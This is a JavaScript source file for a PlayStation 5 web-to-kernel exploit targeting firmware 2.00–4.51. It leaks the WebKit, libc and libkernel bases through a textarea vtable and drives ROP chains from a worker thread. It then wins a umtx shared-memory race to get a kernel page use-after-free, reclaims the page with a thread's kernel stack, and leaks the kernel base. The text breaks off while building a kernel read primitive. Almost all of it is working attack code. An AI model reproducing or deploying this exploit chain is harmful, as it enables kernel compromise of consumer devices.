//Common chain
let chain;
//Bases
let libSceNKWebKitBase;
let libSceLibcInternalBase;
let libKernelBase;
//ASLR defeat patsy (former vtable buddy)
let textArea = document.createElement("textarea");

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = ["2.00", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
const fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
window.fw_float = parseFloat(fw_str);
document.getElementById("current-fw").innerHTML = "Current firmware: " + fw_str;

//load offsets & webkit exploit after.
if (!supportedFirmwares.includes(fw_str)) {
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("");
}

let nogc = [];
let syscalls = {};
let gadgets = {};


let worker = new Worker("rop_slave.js");

//Make sure worker is alive?
async function wait_for_worker() {
    let p1 = await new Promise((resolve) => {
        const channel = new MessageChannel();
        channel.port1.onmessage = () => {
            channel.port1.close();
            resolve(1);
        }
        worker.postMessage(0, [channel.port2]);
    });
    return p1;
}

function find_worker() {

    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    alert("failed to find worker.");
}

function print(string) {
    document.getElementById("console").innerHTML += string + "\n";
    document.getElementById("console").scrollTop = document.getElementById("console").scrollHeight;
}

async function userland() {
    p.pre_chain = pre_chain;
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc_dump = malloc_dump;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;
    p.writestr = writestr;

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
    libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    //debug_log("webkit base: 0x" + libSceNKWebKitBase);

    libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    //debug_log("libkernel base: 0x" + libKernelBase);

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(0x10000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x10000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint32Array(0x1000);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function u8array_from_address(addr, size) {
        let og_array = new Uint8Array(0x10000 + size);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        nogc.push(bufView);
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr) {
        let str = "";
        for (let i = 0; ; i++) {
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    await wait_for_worker();
    let worker_stack = find_worker();
    let original_context = p.malloc(0x40);

    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        //save context for later
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        //Restore earlier saved context but with a twist.
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        //overwrite rop_slave's return address
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        if (p1 === 0) {
            alert("The rop thread ran away. ");
            p.write8(0, 0);
        }
    }

    function debug_bin(bin) {
        let xhr = new XMLHttpRequest();
        xhr.open('POST', 'a.bin', false);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.send(bin);
    }

    chain = new worker_rop();

    async function pin_to_core(core) {
        let level = 3;
        let which = 1;
        let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
        let setsize = 0x10;
        let mask = p.malloc(0x10);
        p.write2(mask, 1 << core);

        let SYS_CPUSET_SETAFFINITY = 0x1E8;
        return await chain.syscall(SYS_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    function thread_pin_to_core(thread, core) {
        let level = 3;
        let which = 1;
        let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
        let setsize = 0x10;
        let mask = p.malloc(0x10);
        p.write2(mask, 1 << core);

        let SYS_CPUSET_SETAFFINITY = 0x1E8;
        thread.self_healing_syscall(SYS_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    async function set_rtprio(prio) {
        let rtprio = p.malloc(0x4);
        p.write2(rtprio.add32(0x0), 0x2);
        p.write2(rtprio.add32(0x2), prio);
        let SYS_RTPRIO_THREAD = 0x1D2;
        let rv = await chain.syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
        //debug_log("rtprio rv = " + rv);
        return rv;
    }

    async function thread_set_rtprio(thread, prio) {
        let rtprio = p.malloc(0x4);
        p.write2(rtprio.add32(0x0), 0x2);
        p.write2(rtprio.add32(0x2), prio);
        let SYS_RTPRIO_THREAD = 0x1D2;
        thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // KERNEL EXPLOIT BEGINS
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    ///////////////////////////////////////////////////////////////////////
    // Setup: Setup
    ///////////////////////////////////////////////////////////////////////

    // Define consts
    let UMTX_OP_SHM         = 26; // 25 on BSD
    let UMTX_SHM_CREAT      = 0x0001;
    let UMTX_SHM_LOOKUP     = 0x0002;
    let UMTX_SHM_DESTROY    = 0x0004;

    // Create a UMTX key area to use, these just have to be valid pointers
    let shm_key = p.malloc(0x100);

    /*
     * Thread setup:
     * 11 - main thread (core 11, high prio) 
     * 13 - destroyer 0 (core 13, high prio)
     * 14 - destroyer 1 (core 14, high prio)
     * 15 - lookup (core 15, low prio)
     */
    const cfg_thread_main           = {core: 11, prio: 256};
    const cfg_thread_destroyer_0    = {core: 13, prio: 256};
    const cfg_thread_destroyer_1    = {core: 14, prio: 256};
    const cfg_thread_lookup         = {core: 15, prio: 767};

    // Pin main thread to core 1 with high prio
    await pin_to_core(cfg_thread_main.core);
    await set_rtprio(cfg_thread_main.prio);

    debug_log("[+] main thread on cpu " + await chain.call(libKernelBase.add32(0x2C20))); // sceKernelGetCurrentCpu

    // Create pipe for read/write prim via stack reads/writes
    const pipe_size         = 0x10000;
    let pipe_slow_fds       = p.malloc(0x8);
    let pipe_scratch_buf    = p.malloc(0x10000);
    await chain.syscall(SYS_PIPE2, pipe_slow_fds, 0);

    let pipe_slow_read_fd   = p.read4(pipe_slow_fds.add32(0x0));
    let pipe_slow_write_fd  = p.read4(pipe_slow_fds.add32(0x4));
    debug_log("[+] created slow pipe 0x" + pipe_slow_read_fd.toString(16) + " <-> 0x" + pipe_slow_write_fd.toString(16));

    /*
     * Variables for kernel prim thread communication
     */
    let kprim_thread_data_neo_found = p.malloc(0x8);
    p.write8(kprim_thread_data_neo_found, 0);
    let kprim_thread_data_neo = p.malloc(0x8);
    p.write8(kprim_thread_data_neo, new int64(0xFFFFFFFF, 0xFFFFFFFF));
    let kprim_thread_data_reset = p.malloc(0x8);
    p.write8(kprim_thread_data_reset, 0);

    let kprim_thread_data_cmd           = p.malloc(0x8);
    p.write8(kprim_thread_data_cmd, 0);
    let kprim_thread_data_uaddr         = p.malloc(0x8);
    let kprim_thread_data_kaddr         = p.malloc(0x8);
    let kprim_thread_data_len           = p.malloc(0x8);

    let kprim_thread_data_read_counter  = p.malloc(0x8);
    p.write8(kprim_thread_data_read_counter, 0);

    let kprim_thread_data_write_counter = p.malloc(0x8);
    p.write8(kprim_thread_data_write_counter, 0);

    let kprim_thread_data_exit_bmp      = p.malloc(0x20 * 0x8);

    const KPRIM_NOP   = 0;
    const KPRIM_READ  = 1;
    const KPRIM_WRITE = 2;

    // Add threads for kernel primitives post-UAF
    let kprim_threads = [];
    for (let i = 0; i < 0x20; i++) {
        let thr = new thread_rop("rop_thr_" + i, 0x1000, 0x200); {
            thread_pin_to_core(thr, cfg_thread_lookup.core);

            const label_waitforcmdorstop = thr.get_rsp();

            // If the one thread has been found that reclaimed, we must exit if we're not the one
            const cond_neofound    = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_neo_found, 1);
            const label_neocheck   = thr.get_rsp();
            const cond_neocheck    = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_neo, i);

            // This syscall does nothing except create a cookie in the stack so we know which thread
            // reclaimed the UAF'd page
            const label_do_cookie  = thr.get_rsp();
            thr.self_healing_syscall(SYS_SCHED_YIELD, 0x13370000 + i);
            const cond_waitforcmd  = thr.create_branch(thr.branch_types.ABOVE, kprim_thread_data_cmd, KPRIM_NOP);

            const label_checkread  = thr.get_rsp();
            const cond_checkread   = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_cmd, KPRIM_READ);
            const label_read = thr.get_rsp();
            thr.increment_dword(kprim_thread_data_read_counter);
            thr.self_healing_syscall(SYS_WRITE, pipe_slow_write_fd, pipe_scratch_buf, 0x8);

            const label_checkwrite = thr.get_rsp();
            const cond_checkwrite  = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_cmd, KPRIM_WRITE);
            const label_write = thr.get_rsp();
            // TODO: kernel write impl
            thr.increment_dword(kprim_thread_data_write_counter);

            const label_waitreset  = thr.get_rsp();
            const cond_waitreset   = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_reset, 1);
            const label_reset      = thr.get_rsp();
            thr.jmp_to_rsp(label_waitforcmdorstop);

            const label_exit = thr.get_rsp();
            thr.push_write8(kprim_thread_data_exit_bmp.add32(i * 0x8), 1);
            //thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0x11223344);

            thr.set_branch_points(cond_neofound, label_neocheck, label_do_cookie);
            thr.set_branch_points(cond_neocheck, label_do_cookie, label_exit);
            thr.set_branch_points(cond_waitforcmd, label_checkread, label_waitforcmdorstop);
            thr.set_branch_points(cond_checkread, label_read, label_checkwrite);
            thr.set_branch_points(cond_checkwrite, label_write, label_waitreset);
            thr.set_branch_points(cond_waitreset, label_reset, label_waitreset);
        }

        kprim_threads.push(thr);
    }

    // Var for telling all threads to start running
    let thread_data_run_all = p.malloc(0x8);
    p.write8(thread_data_run_all, 0);

    // Var for threads to update to indicate readiness (3=go time)
    let thread_data_ready = p.malloc(0x8);
    p.write8(thread_data_ready, 0);

    // Var for allowing threads to restart
    let thread_data_reset_all = p.malloc(0x8);
    p.write8(thread_data_reset_all, 0);

    // Destroyer 0 data
    let thread_data_destroyer_0_run = p.malloc(0x8);
    let thread_data_destroyer_0_stop = p.malloc(0x8);
    let thread_data_destroyer_0_counter = p.malloc(0x8);
    let thread_data_destroyer_0_cpu = p.malloc(0x8);
    p.write8(thread_data_destroyer_0_counter, 0);

    // Destroyer 1 data
    let thread_data_destroyer_1_run = p.malloc(0x8);
    let thread_data_destroyer_1_stop = p.malloc(0x8);
    let thread_data_destroyer_1_counter = p.malloc(0x8);
    let thread_data_destroyer_1_cpu = p.malloc(0x8);
    p.write8(thread_data_destroyer_1_counter, 0);

    // Lookup data
    let thread_data_lookup_run = p.malloc(0x8);
    let thread_data_lookup_stop = p.malloc(0x8);
    let thread_data_lookup_counter = p.malloc(0x8);
    let thread_data_lookup_cpu = p.malloc(0x8);
    let thread_data_lookup_fd = p.malloc(0x8);
    p.write8(thread_data_lookup_counter, 0);
    p.write4(thread_data_lookup_fd, 0x13371337);

    function stop_all_threads() {
        p.write8(thread_data_destroyer_0_stop, 1);
        p.write8(thread_data_destroyer_1_stop, 1);
        p.write8(thread_data_lookup_stop, 1);
    }

    let thread_destroyer_0 = new thread_rop("rop_thread_destroyer0"); {
        thread_pin_to_core(thread_destroyer_0, cfg_thread_destroyer_0.core);
        thread_set_rtprio(thread_destroyer_0, cfg_thread_destroyer_0.prio);
        thread_destroyer_0.fcall(libKernelBase.add32(0x2C20)); // sceKernelGetCurrentCpu
        thread_destroyer_0.write_result(thread_data_destroyer_0_cpu);

        // Labels/code
        const label_a    = thread_destroyer_0.get_rsp();
        const cond_stop  = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_destroyer_0_stop, 1);

        const label_b    = thread_destroyer_0.get_rsp();
        const cond_run   = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_run_all, 1);

        const label_c    = thread_destroyer_0.get_rsp();
        thread_destroyer_0.increment_dword(thread_data_ready);
        const label_wait = thread_destroyer_0.get_rsp();
        const cond_ready = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_ready, 3);

        const label_d    = thread_destroyer_0.get_rsp();
        thread_destroyer_0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key);
        thread_destroyer_0.increment_dword(thread_data_destroyer_0_counter);

        const label_waitreset = thread_destroyer_0.get_rsp();
        const cond_waitreset = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_reset_all, 1);
        const label_restart = thread_destroyer_0.get_rsp();
        thread_destroyer_0.jmp_to_rsp(label_a);

        const label_e    = thread_destroyer_0.get_rsp();

        // Set branch points
        thread_destroyer_0.set_branch_points(cond_stop, label_e, label_b);
        thread_destroyer_0.set_branch_points(cond_run, label_c, label_a);
        thread_destroyer_0.set_branch_points(cond_ready, label_d, label_wait);
        thread_destroyer_0.set_branch_points(cond_waitreset, label_restart, label_waitreset);
    }

    let thread_destroyer_1 = new thread_rop("rop_thread_destroyer1"); {
        thread_pin_to_core(thread_destroyer_1, cfg_thread_destroyer_1.core);
        thread_set_rtprio(thread_destroyer_1, cfg_thread_destroyer_1.prio);
        thread_destroyer_1.fcall(libKernelBase.add32(0x2C20));
        thread_destroyer_1.write_result(thread_data_destroyer_1_cpu);

        // Labels/code
        const label_a    = thread_destroyer_1.get_rsp();
        const cond_stop  = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_destroyer_1_stop, 1);

        const label_b    = thread_destroyer_1.get_rsp();
        const cond_run   = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_run_all, 1);

        const label_c    = thread_destroyer_1.get_rsp();
        thread_destroyer_1.increment_dword(thread_data_ready);
        const label_wait = thread_destroyer_1.get_rsp();
        const cond_ready = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_ready, 3);

        const label_d    = thread_destroyer_1.get_rsp();
        thread_destroyer_1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key);
        thread_destroyer_1.increment_dword(thread_data_destroyer_1_counter);

        const label_waitreset = thread_destroyer_1.get_rsp();
        const cond_waitreset = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_reset_all, 1);
        const label_restart = thread_destroyer_1.get_rsp();
        thread_destroyer_1.jmp_to_rsp(label_a);

        const label_e    = thread_destroyer_1.get_rsp();

        // Set branch points
        thread_destroyer_1.set_branch_points(cond_stop, label_e, label_b);
        thread_destroyer_1.set_branch_points(cond_run, label_c, label_a);
        thread_destroyer_1.set_branch_points(cond_ready, label_d, label_wait);
        thread_destroyer_1.set_branch_points(cond_waitreset, label_restart, label_waitreset);
    }

    let thread_lookup = new thread_rop("rop_thread_lookup"); {
        thread_pin_to_core(thread_lookup, cfg_thread_lookup.core);
        thread_set_rtprio(thread_lookup, cfg_thread_lookup.prio);
        thread_lookup.fcall(libKernelBase.add32(0x2C20));
        thread_lookup.write_result(thread_data_lookup_cpu);

        // Labels/code
        const label_a   = thread_lookup.get_rsp();
        const cond_stop = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_lookup_stop, 1);

        const label_b   = thread_lookup.get_rsp();
        const cond_run  = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_run_all, 1);

        const label_c   = thread_lookup.get_rsp();
        thread_lookup.increment_dword(thread_data_ready);
        const label_wait = thread_lookup.get_rsp();
        const cond_ready = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_ready, 3);

        const label_d   = thread_lookup.get_rsp();
        thread_lookup.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, shm_key);
        thread_lookup.write_result(thread_data_lookup_fd);
        //thread_lookup.push_write8(thread_data_lookup_fd, new int64(0x45454545, 0x46464646));
        thread_lookup.increment_dword(thread_data_lookup_counter);

        const label_waitreset = thread_lookup.get_rsp();
        const cond_waitreset = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_reset_all, 1);
        const label_restart = thread_lookup.get_rsp();
        thread_lookup.jmp_to_rsp(label_a);

        const label_e   = thread_lookup.get_rsp();

        // Set branch points
        thread_lookup.set_branch_points(cond_stop, label_e, label_b);
        thread_lookup.set_branch_points(cond_run, label_c, label_a);
        thread_lookup.set_branch_points(cond_ready, label_d, label_wait);
        thread_lookup.set_branch_points(cond_waitreset, label_restart, label_waitreset);
    }

    // Create threads (they will hang on waiting for run flag)
    var pthread_destroyer_0 = await thread_destroyer_0.spawn_thread();
    var pthread_destroyer_1 = await thread_destroyer_1.spawn_thread();
    var pthread_lookup = await thread_lookup.spawn_thread();

    await chain.call(libKernelBase.add32(0x22130), 1); // sleep 1s

    debug_log("[+] destroyer0 (cpu=0x" + p.read8(thread_data_destroyer_0_cpu) + "), destroyer1 (cpu=0x" + p.read8(thread_data_destroyer_1_cpu) + "), lookup (cpu=0x" + p.read8(thread_data_lookup_cpu) + ")");
    
    ///////////////////////////////////////////////////////////////////////
    // Stage 1: Trigger race
    ///////////////////////////////////////////////////////////////////////

    async function umtx_shm_create(key) {
        let ret = await chain.syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, key);
        //debug_log("utmx_shm_create(0x" + key + ") = 0x" + ret);
        return ret;
    }

    async function umtx_shm_destroy(key) {
        let ret = await chain.syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, key);
        //debug_log("umtx_shm_destroy(0x" + key + ") = 0x" + ret);
        return ret;
    }

    async function shm_resize_tag(fd) {
        let ret = await chain.syscall(SYS_FTRUNCATE, fd, (fd.low  * 0x1000));
        //debug_log("sys_ftruncate(0x" + fd + ", 0x" + (fd.low * 0x1000).toString(16) + ") = 0x" + ret);
        return ret;
    }

    async function shm_close(fd) {
        let ret = await chain.syscall(SYS_CLOSE, fd);
        //debug_log("close(0x" + fd + ") = 0x" + ret);
        return ret;
    }

    async function check_shm_for_tagged_size(fd, original_fd) {
        let OFFSET_STAT_SIZE = 0x48;

        if (fd.low == 0xFFFFFFFF)
            return -1;

        let stat = p.malloc(0x100);
        let ret = await chain.syscall(SYS_FSTAT, fd, stat);

        //debug_log("check_shm_for_tagged_size: fstat=0x" + ret + ", size=0x" + p.read8(stat.add32(OFFSET_STAT_SIZE)));
        let tag = p.read8(stat.add32(OFFSET_STAT_SIZE)).low / 0x1000;
        //debug_log("check_shm_for_tagged_size: tag=0x" + tag.toString(16) + " | fd=0x" + fd.low.toString(16) + " | orig_fd=0x" + original_fd.low.toString(16));

        if (ret.low == 0 && tag != fd.low && tag != original_fd.low) {
            debug_log("[+] overlapped shm regions! tag=0x" + tag.toString(16));
            return tag;
        }

        return -1;
    }

    let winner_fd = -1;
    let lookup_fd = -1;
    for (let attempt = 1; attempt < 0x1000; attempt++) {
        let original_fd = await umtx_shm_create(shm_key.add32(0x0));
        debug_log("[+] [" + attempt + "] original_fd=0x" + original_fd);
        let main_fd = original_fd;

        let truncate_ret = await shm_resize_tag(main_fd);
        let close_ret = await shm_close(main_fd);

        p.write8(thread_data_ready, 0);
        p.write8(thread_data_reset_all, 0);
        p.write8(thread_data_run_all, 1);

        for (;;) {
            if (p.read8(thread_data_ready).low == 3) {
                debug_log("[+] ready threads: " + p.read8(thread_data_ready));
                p.write8(thread_data_run_all, 0);
                break;
            }

            await chain.call(libKernelBase.add32(0x22130), 1); // sleep 1s
        }

        // Migrate to destroyer 0 core and reclaim
        await pin_to_core(cfg_thread_destroyer_0.core);
        let destroyer_0_fd = await umtx_shm_create(shm_key.add32(0x8));
        debug_log("[+] [" + attempt + "] destroyer 0 fd=0x" + destroyer_0_fd);
        await umtx_shm_destroy(shm_key.add32(0x8));

        // Migrate to destroyer 1 core and reclaim
        await pin_to_core(cfg_thread_destroyer_1.core);
        let destroyer_1_fd = await umtx_shm_create(shm_key.add32(0x8));
        debug_log("[+] [" + attempt + "] destroyer 1 fd=0x" + destroyer_1_fd);
        await umtx_shm_destroy(shm_key.add32(0x8));

        // Migrate back to main core
        await pin_to_core(cfg_thread_main.core);

        // Resize shm regions
        truncate_ret = await shm_resize_tag(destroyer_0_fd);
        //debug_log("[+] [" + attempt + "] tried resize=0x" + truncate_ret + " on fd=0x" + destroyer_0_fd);
        truncate_ret = await shm_resize_tag(destroyer_1_fd);
        //debug_log("[+] [" + attempt + "] tried resize=0x" + truncate_ret + " on fd=0x" + destroyer_1_fd);

        // Wait on all counters
        while (p.read8(thread_data_destroyer_0_counter).low != attempt) {}
        while (p.read8(thread_data_destroyer_1_counter).low != attempt) {}
        while (p.read8(thread_data_lookup_counter).low != attempt) {}

        // Check if we won the race
        let thr_lookup_fd = p.read8(thread_data_lookup_fd);
        // HACK: sonys code is shit, so we need to account for the fact that ESRCH can be returned without setting error flag
        if (thr_lookup_fd.low == 3)
            thr_lookup_fd = new int64(0xffffffff, 0xffffffff);
        else
            debug_log("[+] [" + attempt + "] lookup fd=0x" + thr_lookup_fd);

        winner_fd = await check_shm_for_tagged_size(thr_lookup_fd, original_fd);

        // Cleanup other fds
        if (winner_fd != destroyer_0_fd.low)
            await shm_close(destroyer_0_fd);
        if (winner_fd != destroyer_1_fd.low)
            await shm_close(destroyer_1_fd);

        if (winner_fd >= 0) {
            //debug_log("[+] d0=" + p.read8(thread_data_destroyer_0_counter) + ", d1=" + p.read8(thread_data_destroyer_1_counter) + ", l=" + p.read8(thread_data_lookup_counter));
            debug_log("[+] [" + attempt + "] breaking out of loop, we have won the race");
            lookup_fd = thr_lookup_fd.low;
            break;
        } else {
            //debug_log("[+] d0=" + p.read8(thread_data_destroyer_0_counter) + ", d1=" + p.read8(thread_data_destroyer_1_counter) + ", l=" + p.read8(thread_data_lookup_counter));
        }

        // Reset all threads for another try
        p.write8(thread_data_reset_all, 1);
    }

    stop_all_threads();

    if (winner_fd >= 0)
        debug_log("[+] lookup=0x" + lookup_fd.toString(16) + ", winner=0x" + winner_fd.toString(16));
    else {
        debug_log("[!] failed to win race, retry");
        return;
    }

    let spray_key = p.malloc(0x80);
    for (let i = 0; i < 0x20; i++) {
        await umtx_shm_create(spray_key.add32(i * 4));
    }

    // Run a chain to close the winning FD and map on the lookup FD to get a page UAF
    let results = p.malloc(0x10);
    chain.add_syscall(SYS_CLOSE, winner_fd);
    chain.write_result(results.add32(0x0));
    chain.add_syscall(SYS_MMAP, 0, 0x4000, 0x3, 0x1, lookup_fd, 0);
    chain.write_result(results.add32(0x8));

    // Reclaim UAF page with a kernel stack
    for (let td of kprim_threads) {
        td.spawn_thread_chain();
    }

    //alert("going to run");
    await chain.run();

    let close_res = p.read8(results.add32(0x0));
    let kstack = p.read8(results.add32(0x8));
    debug_log("[+] close=0x" + close_res + ", kstack=0x" + kstack);

    if (kstack.low == 0xFFFFFFFF) {
        debug_log("[!] failed to map kstack, retry");
        return;
    }

    var kbase = p.read8(kstack.add32(0x3000 + 0x848));
    kbase.sub32inplace(0x533952);
    debug_log("[+] defeated aslr, kernel base: 0x" + kbase);

    // Find the thread that reclaimed and destroy others
    var cookie = p.read8(kstack.add32(0x3000 + 0x970)).low;
    debug_log("[+] found kstack, cookie=0x" + cookie.toString(16));

    if ((cookie >> 16) != 0x1337) {
        debug_log("[!] bad cookie, retry");
        return;
    }

    let kprim_thread_id = cookie & 0xFFFF;
    p.write8(kprim_thread_data_neo, kprim_thread_id);
    p.write8(kprim_thread_data_neo_found, 1);

    await chain.call(libKernelBase.add32(0x22130), 4); // give a bit for threads to exit
    alert("checking for purged threads 2");
    for (let i = 0; i < 0x20; i++) {
        let bmp_offset = i * 0x8;
        let is_exited = p.read8(kprim_thread_data_exit_bmp.add32(bmp_offset)).low;
        if (is_exited != 1 && i != kprim_thread_id) {
            debug_log("[!] unexpected thread behavior, thread 0x" + i.toString(16) + " is not the one");
        }
    }

    async function send_cmd_to_kprim_thread(cmd, uaddr, kaddr) {
        // Take the thread out of reset
        p.write8(kprim_thread_data_reset, 0);

        // Set args
        p.write8(kprim_thread_data_uaddr, uaddr);
        p.write8(kprim_thread_data_kaddr, kaddr);
        //p.write8(kprim_thread_data_len, len);

        // Set command, we do this last because it kickstarts the thread to do stuff
        p.write8(kprim_thread_data_cmd, cmd);

        await chain.call(libKernelBase.add32(0x22130), 1); // sleep 1s
        debug_log("[+] kprim send (" + cmd + ", 0x" + uaddr + ", 0x" + kaddr + ") read=0x" + p.read8(kprim_thread_data_read_counter) + ", write=0x" + p.read8(kprim_thread_data_write_counter));

        // Command is done, clear the command and put the thread into reset
        p.write8(kprim_thread_data_cmd, KPRIM_NOP);
        p.write8(kprim_thread_data_reset, 1);
    }

    async function slow_copyout(kaddr, uaddr) {
        let OFFSET_IOV_BASE     = 0x00;
        let OFFSET_IOV_LEN      = 0x08;
        let SIZE_IOV            = 0x10;
        let OFFSET_UIO_IOV      = 0x00;
        let OFFSET_UIO_IOVCNT   = 0x08;
        let OFFSET_UIO_OFFSET   = 0x10;
        let OFFSET_UIO_RESID    = 0x18;
        let OFFSET_UIO_SEGFLG   = 0x20;
        let OFFSET_UIO_RW       = 0x24;
        let OFFSET_UIO_TD       = 0x28;
        let search_iov_base     = pipe_scratch_buf;
        let search_iov_len      = 0x8;

        // Fill pipe up to max
        for (let i = 0; i < pipe_size; i += 0x1000) {
            let written_bytes = await chain.syscall(SYS_WRITE, pipe_slow_write_fd, pipe_scratch_buf, 0x1000);
            //debug_log("[+] slow_copyout: wrote 0x" + written_bytes + " bytes to pipe");
        }

        // Signal other thread to write using size we want, the thread will hang until we unblock
        alert("[+] slow_copyout: signalling for thread to write");
        await send_cmd_to_kprim_thread(KPRIM_READ, uaddr, kaddr);

        // Find iov+uio pair on the stack
        let stack_iov_offset = -1;

        for (let i = 0; i < 0x1000; i += 0x8) {
            let possible_iov_base = p.read8(kstack.add32(0x3000 + i + OFFSET_IOV_BASE));
            let possible_iov_len  = p.read8(kstack.add32(0x3000 + i + OFFSET_IOV_LEN));

